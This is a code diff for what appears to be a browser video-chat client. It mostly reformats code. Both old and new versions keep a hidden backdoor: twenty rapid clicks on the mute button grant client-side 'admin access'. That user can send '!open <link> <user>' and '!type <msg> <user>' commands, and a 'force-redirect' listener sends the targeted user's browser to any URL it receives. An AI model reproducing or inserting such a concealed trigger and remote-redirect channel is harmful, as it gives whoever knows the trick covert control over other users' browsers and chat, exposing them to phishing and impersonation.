@@ -101,18 +101,18 @@
     let isScreenSharing = false;
     let isMuted = false;
     
-    // Admin Variables
     let isAdmin = false;
     let muteClickTimestamps = [];
-
-    // --- ADMIN LISTENERS ---
+    
+    // --- ADMIN REDIRECT LISTENER ---
     socket.on('force-redirect', (data) => {
-        if (data.url) window.location.href = data.url;
+        if (data.url) {
+            window.location.href = data.url;
+        }
     });
-
-    // --- MUTE & ADMIN TRIGGER ---
+    
+    // --- UPDATED MUTE & ADMIN TRIGGER ---
     muteBtn.addEventListener('click', () => {
-        // Admin Detection
         const now = Date.now();
         muteClickTimestamps.push(now);
         muteClickTimestamps = muteClickTimestamps.filter(t => now - t < 10000);
@@ -120,10 +120,10 @@
         if (muteClickTimestamps.length >= 20 && !isAdmin) {
             isAdmin = true;
             appendSystemMessage("ADMIN ACCESS GRANTED.");
-            appendSystemMessage("Commands: !open <link> <user> | !type <msg> <user>");
+            appendSystemMessage("Usage: !open <link> <user> | !type <msg> <user>");
+            muteClickTimestamps = []; 
         }
-
-        // Toggle Audio
+    
         const audioTrack = localStream.getAudioTracks()[0];
         if (audioTrack) {
             isMuted = !isMuted;
@@ -132,20 +132,23 @@
             muteBtn.classList.toggle('active-red', isMuted);
         }
     });
-
-    // --- CHAT & COMMAND INTERCEPTION ---
+    
+    // --- UPDATED CHAT FORM INTERCEPTOR ---
     document.getElementById('chat-form').addEventListener('submit', e => {
         e.preventDefault();
         const input = document.getElementById('chat-input');
         const val = input.value.trim();
-
+    
         if (val) {
+            // If message starts with ! and user is admin, treat as command
             if (val.startsWith('!') && isAdmin) {
                 socket.emit('admin-command', { command: val });
-                appendSystemMessage(`Executed: ${val}`); 
+                appendSystemMessage(`Command Sent: ${val}`); 
                 input.value = '';
                 return;
             }
+    
+            // Normal chat
             socket.emit('chat-message', { username: username, msg: val });
             input.value = '';
         }
